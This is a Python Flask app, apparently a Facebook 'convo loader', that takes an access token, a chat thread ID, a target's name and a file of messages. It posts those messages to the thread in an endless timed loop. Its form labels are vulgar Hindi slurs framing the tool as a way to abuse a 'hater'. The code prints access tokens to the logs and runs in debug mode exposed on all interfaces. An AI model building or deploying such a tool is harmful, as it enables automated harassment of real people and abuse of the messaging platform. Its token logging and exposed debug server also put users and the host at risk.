from flask import Flask, request
import requests
from time import sleep
import time
from datetime import datetime
app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message sent using token {access_token}: {message}")
                    else:
                        print(f"Failed to send message using token {access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error while sending message using token {access_token}: {message}")
                print(e)
                time.sleep(30)


    return '''

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MR 🦁SURAJ 💙</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body{
      background-color: #f8f9fa;
    }
    .container{
      max-width: 500px;
      background-color: #fff;
      border-radius: 10px;
      padding: 20px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      margin: 0 auto;
      margin-top: 20px;
    }
    .header{
      text-align: center;
      padding-bottom: 20px;
    }
    .btn-submit{
      width: 100%;
      margin-top: 10px;
    }
    .footer{
      text-align: center;
      margin-top: 20px;
      color: #888;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
    <img src="" width="25">
   <img align="right" alt="coding" width="400" src="">
𝐃𝐄𝐕𝐀 𝐓𝐇𝐀𝐊𝐔𝐑 𝐁𝐑𝐀𝐍𝐃 𝐇𝐄𝐀𝐑 𝐅𝐄𝐄𝐋 𝐓𝐇𝐄 𝐏𝐎𝐖𝐄𝐑 𝐎𝐅 𝐃𝐄𝐕𝐀 𝐁𝐑𝐀𝐍𝐃 𝐗𝐃
<img 
src="" width="25">

</h3>

  <div class="container">
    <form action="/" method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="accessToken"> <img src="" width="25"> 𝐁𝐬𝐝𝐤 𝐭𝐨𝐤𝐞𝐧 𝐝𝐚𝐥 𝐲𝐚 𝐟𝐢𝐫 𝐚𝐩𝐧𝐢 𝐠𝐚𝐧𝐝 𝐝𝐚𝐥: <img src="" width="25"> </label>
        <input type="text" class="form-control" id="accessToken" name="accessToken" required>
      </div>
      <div class="mb-3">
        <label for="threadId"> <img src="" width="25"> 𝐇𝐞𝐭𝐫𝐬 𝐤𝐢 𝐦𝐚 𝐤𝐞 𝐜𝐡𝐮𝐭 𝐤𝐚 𝐚𝐝𝐫𝐬 𝐝𝐚𝐥/𝐢𝐝 𝐥𝐢𝐧𝐤: <img src="" width="25"> </label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx"> <img src="" width="25">𝐂𝐡𝐮𝐝𝐧𝐞 𝐯𝐚𝐥𝐞 𝐤𝐚 𝐧𝐚𝐦𝐞 𝐝𝐚𝐥: <img src="" width="25"> </label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="txtFile"> <img src="" width="25">𝐋𝐚𝐧𝐝 𝐤𝐞 𝐛𝐚𝐥 𝐠𝐚𝐥𝐢 𝐟𝐢𝐥𝐞 𝐜𝐡𝐨𝐨𝐬𝐞 𝐤𝐚𝐫 : <img src="" width="25"> </label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
      </div>
      <div class="mb-3">
        <label for="time"> <img src="" width="25">𝐂𝐇𝐔𝐃𝐀𝐈 𝐊𝐈 𝐒𝐏𝐄𝐄𝐃 𝐃𝐀𝐋 𝐆𝐀𝐍𝐃𝐔 <img src="" width="25"> :</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit"> <img src="" width="25"> 𝐨𝐲𝐞 𝐠𝐚𝐧𝐝𝐮 𝐬𝐚𝐛 𝐬𝐚𝐡𝐢 𝐝𝐚𝐥 𝐝𝐢𝐲𝐚 𝐡𝐨 𝐭𝐨 <img src="" width="25"> 𝐜𝐥𝐢𝐜𝐤 𝐤𝐚𝐫 /𝐫𝐮𝐧𝐧𝐢𝐧𝐠  <img src="" width="25"> </button>
    </form>
  </div>
  <footer class="footer">
    <p>&copy; 
    <img align="right" alt="coding" width="400" src=""> <img src="" width="25">  𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐛𝐲 𝐃𝐞𝐯𝐚 𝐓𝐡𝐚𝐤𝐮𝐫 2024 𝐚𝐥𝐥 𝐫𝐢𝐠𝐡𝐭𝐬 𝐑𝐞𝐬𝐞𝐫𝐯𝐞𝐝 <img src="" width="25"> </p>
    <p> <img src="" width="25">𝐂𝐨𝐧𝐯𝐨 𝐥𝐨𝐝𝐞𝐫 𝐢𝐧𝐛𝐨𝐱 /𝐠𝐫𝐨𝐮𝐩𝐬 𝐭𝐨𝐨𝐥 <img src="" width="25"></p>
    <p> <img src="" width="25"> <img src="" width="25">𝐇𝐨𝐭 𝐜𝐡𝐮𝐭 𝐤𝐚 𝐝𝐢𝐰𝐚𝐧𝐚 𝐃𝐞𝐯𝐚 𝐓𝐡𝐚𝐤𝐮𝐫 𝐗𝐝 <img align="right" alt="Coding" width="400" src=""> <img src="" width="25"> <img src="" width="25"> <a href="https://github.com/DEVA-THAKUR007</a></p>
  </footer>
</body>
  </html>
    '''


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    app.run(debug=True)
